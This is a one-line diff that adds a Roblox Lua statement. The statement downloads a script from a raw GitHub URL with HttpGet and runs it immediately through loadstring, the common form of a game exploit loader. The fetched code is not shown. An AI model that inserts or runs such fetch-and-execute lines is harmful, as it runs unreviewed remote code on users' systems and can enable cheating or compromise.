@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DrPoppadopolist/DrPoppaV3/master/Script",true))()
